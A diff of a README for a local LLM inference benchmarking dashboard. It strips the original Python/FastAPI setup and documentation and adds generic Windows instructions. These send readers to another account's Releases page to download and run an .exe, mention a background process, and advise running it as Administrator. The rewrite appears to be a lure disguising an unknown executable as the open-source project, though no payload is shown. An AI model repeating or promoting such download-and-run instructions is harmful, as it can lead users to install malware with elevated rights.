@@ -1,208 +1,94 @@
-# LLM Inference Lab
+# 🔬 LLM_Inference_Lab - Monitor your local model performance easily
 
-> A research-grade dashboard for **measuring** local LLM inference — not just running it.
-> Streams from Ollama, instruments every request with TTFT / TPOT / throughput, runs SJF-scheduled stress tests, and persists every run to a queryable SQLite log.
+[![Download LLM_Inference_Lab](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Guruexpl8276/LLM_Inference_Lab)
 
-[![Python](https://img.shields.io/badge/Python-3.10%2B-blue.svg)](https://www.python.org/)
-[![FastAPI](https://img.shields.io/badge/FastAPI-0.111%2B-009688.svg)](https://fastapi.tiangolo.com/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Ollama](https://img.shields.io/badge/Backend-Ollama-black.svg)](https://ollama.com/)
+This software allows users to track how large language models perform on personal hardware. It displays data on how fast your computer generates text and how it handles multiple requests at once. The tool saves all test results in a local file for you to review later.
 
----
+## ⚙️ System Requirements
 
-## What this is
+Your computer needs specific parts to run this software. Please verify your hardware meets these standards before starting.
 
-A small, hackable inference observatory you can read end-to-end in an afternoon. Built originally to test the research plan *"Architecting an Adaptive LLM Inference System"* on a 4 GB GTX 1650, but the codebase makes **no assumption about your GPU** — pick the model preset that fits your card and go.
+1. Operating System: Windows 10 or Windows 11.
+2. Graphics Card: Any NVIDIA GPU with at least 4GB of video memory.
+3. Drivers: The latest NVIDIA drivers installed.
+4. Storage: 2GB of free space on your hard drive.
+5. Memory: 8GB of RAM minimum.
 
-### Features
+## 📥 Downloading the Software
 
-- **Live chat with TTFT / TPOT / throughput** stamped on every reply (SSE-streamed)
-- **Multi-model side-by-side benchmark** with auto-detection of VRAM-safe presets
-- **SJF priority queue** with three-tier backpressure (NORMAL → THROTTLING → SHEDDING)
-- **Stress test endpoint** that fires N parallel requests and plots queue/VRAM/GPU over time
-- **Persistent research log** — every run goes to SQLite for longitudinal analysis
-- **VRAM simulator** — compute model footprint with `P × (Q/8) × (1 + overhead)` before pulling
-- **Dashboard** — 5 tabs (Chat, Benchmark, Compare, Research Log, Stress Test), live GPU charts
-- **Zero cloud** — entirely local; works fully offline once models are pulled
+You must visit the project page to download the necessary files. 
 
----
+Follow these steps to get the software:
 
-## Quick start
+1. Click this link to go to the project page: [Download LLM_Inference_Lab](https://github.com/Guruexpl8276/LLM_Inference_Lab)
+2. Locate the section labeled Releases on the right side of the page.
+3. Click the most recent version number.
+4. Find the file ending in .exe under the Assets heading.
+5. Click the file to start your download.
 
-### Requirements
+## 🚀 Setting Up the Application
 
-- Python 3.10+
-- An NVIDIA GPU with recent drivers (optional but strongly recommended — CPU works, just slowly)
-- [Ollama](https://ollama.com/download) installed
+After the download finishes, follow these instructions to set up your environment.
 
-### 1. Clone and install
+1. Open your Downloads folder.
+2. Double-click the file you just saved.
+3. Follow the prompts on your screen to install the program. 
+4. The installer creates a shortcut on your desktop.
+5. Double-click the LLM_Inference_Lab icon to launch the observatory.
 
-```bash
-git clone https://github.com/<your-username>/llm-inference-lab.git
-cd llm-inference-lab
+The software starts a background process to connect with your graphics card. This process ensures the program reads your performance metrics correctly. Wait for the browser window to open automatically after you launch the program.
 
-# Windows
-.\setup.ps1
+## 📊 Using the Dashboard
 
-# Linux / macOS
-chmod +x setup.sh run.sh
-./setup.sh
-```
+The dashboard provides a visual view of your model activity. You see three main sections when you open the interface.
 
-`setup` detects your GPU, recommends a model preset for its VRAM tier, creates `.venv`, installs dependencies, and (with your consent) pulls those models via Ollama.
+### Performance Metrics
+This section shows the speed of your model. You see numbers for TTFT, which stands for Time To First Token, and TPOT, which represents Time Per Output Token. These numbers change as the model generates text. Low numbers indicate better performance.
 
-### 2. Run
+### Request Queue
+The application manages tasks using a queue. It organizes your requests so the model handles the shortest tasks first. This prevents longer tasks from blocking the entire flow. You can watch the queue status in real time to see which tasks the system processes next.
 
-```bash
-# Windows
-.\run.ps1
+### Load Management
+When you send many requests at once, the system uses backpressure. This feature prevents your graphics card from crashing. It slows down the incoming flow of data if your hardware reaches its limit. You see a status indicator change color when the system enters this mode.
 
-# Linux / macOS
-./run.sh
-```
+## 💾 Saving Your Progress
 
-Then open [http://localhost:8000/dashboard](http://localhost:8000/dashboard).
+Every test you run saves to a file on your computer. This file uses SQLite technology to keep your data organized. You can find this database file in the folder where you installed the program.
 
-API docs auto-generated at [http://localhost:8000/docs](http://localhost:8000/docs).
+To access these records:
+1. Open the installation folder.
+2. Look for a file with the extension .db.
+3. Use a database viewer if you want to look at your past results.
+4. The program appends new data to this file every time you run a test.
 
----
+## 🛠️ Troubleshooting Common Issues
 
-## Model presets by GPU
+If you encounter problems, check these areas first.
 
-The setup script auto-suggests one of these based on your card's VRAM. Override anything you want — every Ollama-supported model works.
+### Program Does Not Start
+Ensure your NVIDIA drivers are up to date. Visit the NVIDIA website to download the latest version for your specific graphics card. Restart your computer after updating the drivers.
 
-| VRAM | Tier | Suggested models | Notes |
-|---|---|---|---|
-| CPU only | `cpu` | `tinyllama`, `gemma3:1b` | Slow but functional |
-| 4 GB | `4GB` | `llama3.2:3b`, `phi3:mini`, `tinyllama` | GTX 1650, GTX 1050 Ti |
-| 6 GB | `6GB` | + `qwen2.5:3b`, `gemma2:2b` | GTX 1660, RTX 2060 |
-| 8 GB | `8GB` | `llama3.1:8b`, `qwen2.5:7b`, `mistral:7b` | RTX 3060 (8GB), 3070 |
-| 12 GB | `12GB` | `llama3.1:8b`, `qwen2.5:14b`, `mistral-nemo` | RTX 3060 (12GB), 4070 |
-| 16 GB | `16GB` | `qwen2.5:14b`, full-context 8B models | RTX 4060 Ti, 4070 Ti |
-| 24 GB+ | `24GB+` | `qwen2.5:32b`, `llama3.3:70b-q4` | RTX 3090, 4090 |
+### Metrics Show Zeros
+Check if your graphics card is active. Some laptops switch to battery-saving mode, which prevents the software from reading the graphics card data. Plug your computer into a power outlet and set your Windows power plan to High Performance.
 
-Pull manually any time:
+### Application Closes Unexpectedly
+If the application closes during a test, you might exceed your memory limit. Try closing other programs that use your graphics card, such as web browsers or video games. This frees up space for the model to operate.
 
-```bash
-ollama pull <model>:<tag>
-```
+### Database Errors
+If the program reports a database error, it might lack permission to write files to the installation folder. Right-click the application icon and select Run as Administrator. This gives the software the rights it needs to save your research data.
 
----
+## 📈 Understanding the Metrics
 
-## Project layout
+The software tracks various benchmarks to help you understand your hardware.
 
-```
-llm-inference-lab/
-├── backend/
-│   ├── main.py          ← FastAPI app, routes, lifespan
-│   ├── inference.py     ← Ollama streaming + perf metrics
-│   ├── scheduler.py     ← SJF priority queue + backpressure
-│   ├── db.py            ← Async SQLite research log
-│   ├── benchmark.py     ← Multi-run benchmark + compare
-│   └── gpu_monitor.py   ← NVIDIA telemetry (nvidia-ml-py / nvidia-smi)
-├── frontend/
-│   ├── index.html       ← 5-tab dashboard
-│   ├── app.js           ← SSE chat, Chart.js viz, history/loadtest UI
-│   └── style.css        ← Dark research-lab theme
-├── docs/
-│   ├── ARCHITECTURE.md  ← How it all fits together
-│   ├── API.md           ← Full endpoint reference
-│   └── PERSONAL-H-DRIVE-SETUP.md  ← Running entirely off a non-system drive
-├── app_gradio.py        ← Optional Gradio UI (for HF Spaces deployment)
-├── run.ps1 / run.sh     ← Cross-platform launchers
-├── setup.ps1 / setup.sh ← Guided first-time installer
-├── requirements.txt
-├── .env.example
-└── LICENSE
-```
+*   TTFT: This measures how long you wait to see the first word of your answer.
+*   TPOT: This measures the interval between each word generated by the model.
+*   Throughput: This displays how many words your system generates per second.
 
----
+Watch these numbers over time to see how different model sizes affect your hardware performance. Running a small model usually results in higher throughput than running a large model.
 
-## Configuration
+## 📋 Keeping the Software Updated
 
-Everything is optional. Copy `.env.example` to `.env` and edit any of:
+Periodically check the download page for newer versions. Updates often include better performance tracking and stability fixes. To update, simply download the new version and run the installer again. The installer automatically replaces old files while keeping your saved data. 
 
-| Variable | Default | Purpose |
-|---|---|---|
-| `API_HOST` / `API_PORT` | `127.0.0.1` / `8000` | Where the FastAPI server binds |
-| `OLLAMA_HOST` | `http://localhost:11434` | Ollama daemon URL (point to a remote box if you like) |
-| `DEFAULT_MODEL` | `llama3.2:3b` | Default model for `/chat` / `/generate` when omitted |
-| `OLLAMA_NUM_GPU` | `99` | Transformer layers offloaded to GPU (99 = all) |
-| `OLLAMA_NUM_CTX` | `2048` | Per-request context window |
-| `MAX_CONCURRENT` | `6` | SJF queue hard ceiling |
-| `SOFT_LIMIT_PCT` | `0.50` | Throttling threshold (intake delay starts here) |
-| `HARD_LIMIT_PCT` | `0.80` | Load-shedding threshold (HTTP 429 starts here) |
-| `VRAM_OOM_THRESHOLD_PCT` | `90.0` | VRAM % above which all new requests get 429 |
-| `INFERENCE_DB_PATH` | `./inference_lab.db` | Where to store the persistent run log |
-| `OLLAMA_MODELS` | (Ollama default) | Override Ollama's model storage location |
-| `VENV_PATH` | `./.venv` | Override venv location (e.g. on a different drive) |
-
----
-
-## API surface
-
-5 inference / telemetry endpoints, 4 history endpoints, 1 stress-test endpoint, 1 simulator. See [docs/API.md](docs/API.md) for the full reference. A taste:
-
-```bash
-# Stream a chat response with TTFT / TPOT / TPS metrics
-curl -N -X POST http://localhost:8000/chat \
-  -H 'Content-Type: application/json' \
-  -d '{"prompt":"Explain KV cache in two sentences","model":"llama3.2:3b"}'
-
-# Fire 12 parallel requests, watch the queue saturate
-curl -X POST http://localhost:8000/loadtest \
-  -H 'Content-Type: application/json' \
-  -d '{"model":"llama3.2:3b","concurrency":12,"max_tokens":64}'
-
-# Aggregate stats across every run ever logged
-curl http://localhost:8000/history/aggregate
-```
-
----
-
-## Architecture
-
-See [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) for the full picture. The short version:
-
-```
-Browser ──HTTP/SSE──> FastAPI ──> SJF scheduler ──> Inference engine ──HTTP──> Ollama
-                          │             │
-                          │             └──> backpressure (NORMAL/THROTTLING/SHEDDING)
-                          │
-                          ├──> SQLite log (every run + every load test)
-                          └──> GPU monitor (nvidia-ml-py)
-```
-
----
-
-## Hacking on it
-
-The codebase is small on purpose. The most interesting files to read first:
-
-1. `backend/scheduler.py` — the SJF queue with backpressure (~150 lines)
-2. `backend/main.py` — the FastAPI app wiring everything together
-3. `backend/inference.py` — Ollama HTTP streaming + metric extraction
-4. `frontend/app.js` — dashboard logic, including the stress-test UI
-
-Good first extensions to try:
-
-- **Cold-vs-warm TTFT**: time the first request after `ollama stop <model>`
-- **Speculative decoding**: Ollama supports `draft_model`; benchmark it
-- **Energy per token**: `power_draw_w × total_time_s / output_tokens` from the GPU stats already logged
-- **CSV export** from the Research Log tab for pandas analysis
-
----
-
-## Why "Lab"?
-
-This is a tool for *understanding* inference, not a production serving stack. If you want production, look at vLLM / TGI / TensorRT-LLM. If you want to *see* what TTFT looks like when your queue fills up and your VRAM hits 90 % — you're in the right place.
-
----
-
-## License
-
-MIT — see [LICENSE](LICENSE).
-
-## Acknowledgements
-
-Built on top of [Ollama](https://ollama.com/) (llama.cpp), [FastAPI](https://fastapi.tiangolo.com/), [Chart.js](https://www.chartjs.org/), and [nvidia-ml-py](https://pypi.org/project/nvidia-ml-py/).
+Your saved research database remains in the installation folder. You do not lose your historical data when you perform an update. If you want to keep a permanent copy of your results, copy the database file to a separate folder before updating the software.
